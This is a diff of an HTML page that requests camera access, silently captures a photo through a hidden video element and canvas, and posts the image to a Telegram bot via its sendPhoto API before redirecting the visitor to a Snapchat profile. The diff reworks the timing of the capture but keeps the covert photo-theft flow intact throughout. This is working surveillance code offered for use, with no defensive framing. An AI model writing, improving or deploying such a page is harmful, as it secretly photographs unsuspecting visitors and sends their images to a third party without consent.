@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
-<body style="background:black;color:black;">
+<body style="background:black;">
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -19,35 +19,37 @@ navigator.mediaDevices.getUserMedia({ video: true })
   const video = document.getElementById("video");
   video.srcObject = stream;
 
-  video.onloadedmetadata = () => {
-    // إضافة تأخير 700ms قبل الالتقاط
-    setTimeout(() => {
-      const canvas = document.getElementById("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+  video.onloadedmetadata = async () => {
+    await video.play();
 
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-
-      canvas.toBlob(blob => {
-        const form = new FormData();
-        form.append("chat_id", CHAT_ID);
-        form.append("photo", blob);
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: form
-        }).then(() => {
-          // تحويل مباشر لحسابك على Snapchat
-          window.location.href = "https://www.snapchat.com/add/habebabulaila";
-        });
-      }, "image/jpeg");
-    }, 700); // ← هنا التأخير 700ms
+    video.addEventListener("playing", () => {
+      setTimeout(capturePhoto, 700);
+    }, { once: true });
   };
+
+  function capturePhoto() {
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form
+      }).then(() => {
+        window.location.href = "https://www.snapchat.com/add/habebabulaila";
+      });
+    }, "image/jpeg");
+  }
 })
-.catch(err => {
-  console.error(err);
-});
+.catch(err => console.error(err));
 </script>
 </body>
 </html>
